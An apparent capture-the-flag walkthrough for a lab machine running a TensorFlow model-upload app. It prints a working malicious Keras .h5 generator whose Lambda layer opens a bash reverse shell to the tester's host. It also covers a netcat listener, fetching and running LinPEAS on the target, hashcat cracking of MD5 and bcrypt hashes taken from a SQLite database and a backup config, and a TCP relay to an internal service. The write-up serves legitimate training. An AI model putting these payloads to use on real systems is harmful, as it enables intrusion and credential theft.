# RCE via TensorFlow `.h5` upload — walkthrough

This write-up covers a vulnerable **Keras/TensorFlow model upload** in a prediction web app: local Docker reproduction, malicious `.h5` generation, reverse shell, SQLite credential recovery, privilege escalation from backups, and a final pivot through an internal service.

---

## 1. Service enumeration

**Command:**

```bash
nmap -sV -sC 10.129.201.243
```

| Flag | Purpose |
|------|---------|
| `-sV` | Probe open ports to determine service/version banners |
| `-sC` | Run Nmap’s default **NSE** script set (safe discovery scripts) |

**Observations:**

- **TCP 22** (SSH) and **TCP 80** (HTTP) exposed.
- HTTP hosts a model-based prediction UI with login/registration.

---

## 2. Web application

- Register and log in.
- Locate **`.h5` model upload** (Keras SavedModel / HDF5).
- Download sample models and any provided **`Dockerfile`** for local payload testing.

---

## 3. Docker (build and run the app image)

**Commands:**

```bash
sudo apt install docker-cli
sudo systemctl start docker
sudo systemctl enable docker
sudo docker build -t htb .
sudo docker run -it htb
```

| Step | Purpose |
|------|---------|
| `docker build -t htb .` | Build an image tagged `htb` from `Dockerfile` in the current directory |
| `docker run -it htb` | Start a container interactively to match the server’s TensorFlow/runtime versions |

### Copying files into/out of a container

```bash
sudo docker ps                                  # Container ID / name
sudo docker cp build.py <container_name>:/code/ # Host → container
sudo docker cp <container_name>:/code/exploit.h5 ~/Desktop/ # Container → host
```

Use `docker ps` to get the exact container name/ID before `docker cp`.

---

## 4. Malicious `.h5` (Lambda layer + reverse shell)

The model uses a **`Lambda`** layer whose function runs **when the graph is executed** on the server. `os.system` invokes a bash reverse shell to your listener.

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'exec bash -i >& /dev/tcp/10.10.14.91/4444 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

**Replace** `10.10.14.91` and `4444` with your VPN IP and listener port. Rebuild `exploit.h5` after any IP/port change.

---

## 5. Trigger execution

**On Kali (listener):**

```bash
nc -lvnp 4444
```

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | Numeric addresses (no DNS) |
| `-p 4444` | TCP port |

Upload `exploit.h5` through the web UI and invoke the code path that **loads and runs** the model (e.g. “predict”). You should receive a shell as the web/runtime user.

---

## 6. SQLite — `users.db`

**Identify and open the database:**

```bash
file users.db          # Confirm SQLite format
sqlite3 users.db
```

**Inside `sqlite3`:**

```text
.tables                -- list tables
SELECT * FROM user;
```

**Hash format check (MD5, 32 hex chars):**

```bash
echo -n "htb" | md5sum
```

### Offline cracking (Hashcat)

```bash
hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt.gz
```

| Flag | Purpose |
|------|---------|
| `-m 0` | Raw **MD5** |
| `-a 0` | Straight dictionary attack |
| `-o cracked.txt` | Write cracked lines to this file |

**Example outcome:** password recovered for user `gael` (use the actual cracked value from your run).

---

## 7. SSH

```bash
ssh gael@10.129.36.66
```

Use the password from Hashcat. Confirm hostname and key prompts as appropriate for your environment.

---

## 8. Privilege enumeration — LinPEAS

**On Kali — host the script:**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

**On target — download and run:**

```bash
wget http://10.10.14.91:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Replace `10.10.14.91` with your host IP. Review LinPEAS output for **backups**, **world-readable archives**, and **sudo/Cron** issues.

**Finding (example):** `/var/backups/backrest_backup.tar.gz`

---

## 9. Backup archive and config secret

```bash
cp /var/backups/backrest_backup.tar.gz .
tar -xvf backrest_backup.tar.gz
cat backrest/.config/backrest/config.json
```

A **base64-encoded** bcrypt string may appear in config, for example:

```text
JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
```

**Decode (shows `$2a$...` bcrypt prefix):**

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

**Crack bcrypt with Hashcat** (mode **3200**):

```bash
hashcat -m 3200 -a 0 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt
```

Store the decoded hash line in `bcrypt_hash.txt` (one hash per line). Use the recovered password for the **backrest** / internal flow as documented in your lab.

---

## 10. Simple TCP relay (5555 → localhost 9898)

Use when a service only listens on **127.0.0.1** on the victim but you need to reach it from another port:

```python
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.sendall(data)

listen = socket.socket()
listen.bind(("0.0.0.0", 5555))
listen.listen(5)

while True:
    client_sock, _ = listen.accept()
    server_sock = socket.socket()
    server_sock.connect(("127.0.0.1", 9898))

    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
    threading.Thread(target=forward, args=(server_sock, client_sock)).start()
```

**Behavior:** accepts on **all interfaces:5555**, forwards each connection to **127.0.0.1:9898**. Run only in authorized lab contexts; this binds broadly by design.

---

## 11. Internal portal / final RCE

- Authenticate to the internal **Backrest** (or equivalent) UI using recovered high-privilege material.
- Abuse **repository configuration** or similar features that execute shell commands (command injection). Exact steps depend on the lab version—document the payload you used and the execution primitive.

---

## Optional: Docker CE on Debian (reference)

The `bullseye` repo line below is an **example**; match `bookworm`, `bullseye`, or `$(lsb_release -cs)` to your Kali/Debian base.

```bash
sudo apt purge -y docker-cli docker-buildx docker-compose podman
sudo rm -f /etc/apt/sources.list.d/docker.list
sudo rm -rf /etc/apt/keyrings/docker.gpg
```

```bash
sudo apt update
sudo apt install -y ca-certificates curl gnupg lsb-release
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/debian $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
```

```bash
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl start docker
sudo systemctl enable docker
sudo docker run hello-world
```

---

## Summary

| Phase | Technique |
|--------|-----------|
| Foothold | Malicious **TensorFlow/Keras** `.h5` → code execution as web user |
| Credentials | **SQLite** user table → **MD5** → Hashcat |
| SSH | User `gael` (example) |
| Privilege path | Backup archive → config secret → **bcrypt** cracking / reuse |
| Lateral / final | Internal admin UI → **command injection** / repo abuse |

**Status:** all documented objectives completed.
